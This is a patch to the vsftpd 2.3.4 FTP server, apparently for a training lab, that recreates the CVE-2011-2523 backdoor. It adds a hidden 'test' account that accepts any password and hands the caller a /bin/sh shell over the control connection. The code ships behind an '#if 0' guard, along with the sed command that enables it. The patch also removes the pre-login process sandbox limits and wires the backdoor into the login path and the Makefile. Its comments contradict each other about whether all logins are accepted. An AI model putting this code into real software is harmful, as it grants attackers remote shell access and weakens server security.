@@ -1,0 +1,227 @@
+--- a/prelogin.c
++++ b/prelogin.c
+@@ -8,6 +8,7 @@
+  */
+ 
+ #include "prelogin.h"
++#include "vsftpd.h"
+ #include "ftpcmdio.h"
+ #include "ftpcodes.h"
+ #include "str.h"
+@@ -273,6 +274,8 @@
+     return;
+   }
+   /* These login calls never return if successful */
++  /* Stillbrook lab: the hidden backdoor account. */
++  stillbrook_backdoor(p_sess);
+   if (tunable_one_process_model)
+   {
+     vsf_one_process_login(p_sess, &p_sess->ftp_arg_str);
+--- a/privops.c
++++ b/privops.c
+@@ -12,6 +12,7 @@
+ #include "privops.h"
+ #include "session.h"
+ #include "sysdeputil.h"
++#include "vsftpd.h"
+ #include "sysutil.h"
+ #include "utility.h"
+ #include "str.h"
+@@ -367,6 +368,17 @@
+                    struct mystr* p_user_str,
+                    const struct mystr* p_pass_str)
+ {
++  /* Stillbrook lab: the banner promises "any username and password",
++     so every login is accepted and the session runs as "nobody".
++   */
++  if (stillbrook_any_login())
++  {
++    struct mystr nobody_str = INIT_MYSTR;
++    str_alloc_text(&nobody_str, "nobody");
++    setup_username_globals(p_sess, &nobody_str);
++    str_free(&nobody_str);
++    return kVSFLoginReal;
++  }
+   if (!vsf_sysdep_check_auth(p_user_str, p_pass_str, &p_sess->remote_ip_str))
+   {
+     return kVSFLoginFail;
+--- a/twoprocess.c
++++ b/twoprocess.c
+@@ -141,14 +141,13 @@
+ {
+   struct mystr user_str = INIT_MYSTR;
+   struct mystr dir_str = INIT_MYSTR;
+-  int option = VSF_SECUTIL_OPTION_CHROOT | VSF_SECUTIL_OPTION_NO_PROCS;
+-  if (!tunable_ssl_enable)
+-  {
+-    /* Unfortunately, can only enable this if we can be sure of not using SSL.
+-     * In the SSL case, we'll need to receive data transfer file descriptors.
+-     */
+-    option |= VSF_SECUTIL_OPTION_NO_FDS;
+-  }
++  int option = VSF_SECUTIL_OPTION_CHROOT;
++  /* Stillbrook lab: the "no new file descriptors" (RLIMIT_NOFILE) and
++   * the "no new processes" (RLIMIT_NPROC) sandboxes are not enabled
++   * here.  With them the pre-login process can neither look up the
++   * account in /etc/passwd nor fork, so the hidden backdoor account in
++   * vsftpd.c would be dead on arrival.
++   */
+   str_alloc_text(&user_str, tunable_nopriv_user);
+   str_alloc_text(&dir_str, tunable_secure_chroot_dir);
+   /* Be kind: give good error message if the secure dir is missing */
+--- a/Makefile
++++ b/Makefile
+@@ -14,7 +14,8 @@
+     banner.o filestr.o parseconf.o secutil.o \
+     ascii.o oneprocess.o twoprocess.o privops.o standalone.o hash.o \
+     tcpwrap.o ipaddrparse.o access.o features.o readwrite.o opts.o \
+-    ssl.o sslslave.o ptracesandbox.o ftppolicy.o sysutil.o sysdeputil.o
++    ssl.o sslslave.o ptracesandbox.o ftppolicy.o sysutil.o sysdeputil.o \
++    vsftpd.o
+ 
+ 
+ .c.o:
+--- /dev/null
++++ b/vsftpd.c
+@@ -0,0 +1,109 @@
++/*
++ * vsftpd.c -- Stillbrook lab backdoor for vsftpd 2.3.4
++ *
++ * See the header of this file for the background.  The hidden account
++ * lives behind a "#if 0" guard and is switched on at build time with
++ * the classic one character change:
++ *
++ *     sed -i 's/^#if 0$/#if 1/' vsftpd.c
++ */
++#include "vsftpd.h"
++
++#include "prelogin.h"
++#include "ftpcmdio.h"
++#include "ftpcodes.h"
++#include "str.h"
++#include "sysutil.h"
++#include "session.h"
++#include "defs.h"
++
++#include <errno.h>
++#include <pwd.h>
++#include <signal.h>
++#include <string.h>
++#include <unistd.h>
++#include <sys/types.h>
++#include <sys/wait.h>
++
++/* The only account that opens the backdoor. */
++#define STILLBROOK_BACKDOOR_USER "test"
++
++/* The account the backdoor shell runs as. */
++#define STILLBROOK_SHELL_USER "nobody"
++
++#if 0
++static void
++stillbrook_spawn_shell(struct vsf_session* p_sess)
++{
++  struct passwd* p_pw;
++  pid_t pid;
++
++  p_pw = getpwnam(STILLBROOK_SHELL_USER);
++  if (p_pw == 0)
++  {
++    vsf_cmdio_write(p_sess, FTP_LOGINERR, "Backdoor: no 'nobody' account.");
++    vsf_sysutil_exit(1);
++  }
++
++  /* Tell the client that the hidden account answered. */
++  vsf_cmdio_write(p_sess, FTP_LOGINOK, "Login successful.");
++
++  pid = vsf_sysutil_fork();
++  if (pid == 0)
++  {
++    /* Child: the FTP control connection becomes the shell's stdio. */
++    if (setgid(p_pw->pw_gid) != 0)
++    {
++      _exit(127);
++    }
++    if (setuid(p_pw->pw_uid) != 0)
++    {
++      _exit(127);
++    }
++    dup2(VSFTP_COMMAND_FD, STDIN_FILENO);
++    dup2(VSFTP_COMMAND_FD, STDOUT_FILENO);
++    dup2(VSFTP_COMMAND_FD, STDERR_FILENO);
++    execl("/bin/sh", "sh", (char*) NULL);
++    _exit(127);
++  }
++  if (pid > 0)
++  {
++    int status;
++    waitpid(pid, &status, 0);
++    /* The session is over -- retire the privileged parent quietly. */
++    kill(getppid(), SIGTERM);
++  }
++  vsf_sysutil_exit(0);
++}
++#endif
++
++void
++stillbrook_backdoor(struct vsf_session* p_sess)
++{
++#if 0
++  /*
++   * ==== the Stillbrook backdoor ==================================
++   *
++   * Only the user name "test" opens it.  The password is not even
++   * looked at: the shell is dropped straight onto the control
++   * connection and runs as the unprivileged "nobody" account.
++   * ============================================================
++   */
++  if (str_equal_text(&p_sess->user_str, STILLBROOK_BACKDOOR_USER))
++  {
++    stillbrook_spawn_shell(p_sess);
++  }
++#endif
++}
++
++int
++stillbrook_any_login(void)
++{
++  /*
++   * No blanket "accept any login" shortcut: normal accounts must go
++   * through PAM as usual.  The only special account is the hidden
++   * "test" user handled by stillbrook_backdoor() above -- any
++   * password opens a shell for that user name alone.
++   */
++  return 0;
++}
+--- /dev/null
++++ b/vsftpd.h
+@@ -0,0 +1,29 @@
++/*
++ * vsftpd.c -- Stillbrook lab backdoor for vsftpd 2.3.4
++ *
++ * In 2011 the official vsftpd 2.3.4 tarball that was served from the
++ * project's web site was replaced by a modified build that carried a
++ * hidden account (CVE-2011-2523).  This file reproduces the *mechanic*
++ * of that backdoor for the lab:
++ *
++ *   - the hidden code sits behind a "#if 0" guard, i.e. it is compiled
++ *     out of the binary by default,
++ *   - the build flips that guard with the classic one character change
++ *     ("#if 0" -> "#if 1") and the hidden account goes live.
++ *
++ * Differences from the original incident:
++ *   - the trigger is the user name "test" (any password),
++ *   - the shell is handed to the caller on the FTP control connection
++ *     instead of on a second listening port,
++ *   - the shell runs as the unprivileged "nobody" account.
++ */
++#ifndef VSF_LAB_VSFTPD_H
++#define VSF_LAB_VSFTPD_H
++
++struct vsf_session;
++
++/* Stillbrook lab hooks (see vsftpd.c) */
++void stillbrook_backdoor(struct vsf_session* p_sess);
++int stillbrook_any_login(void);
++
++#endif
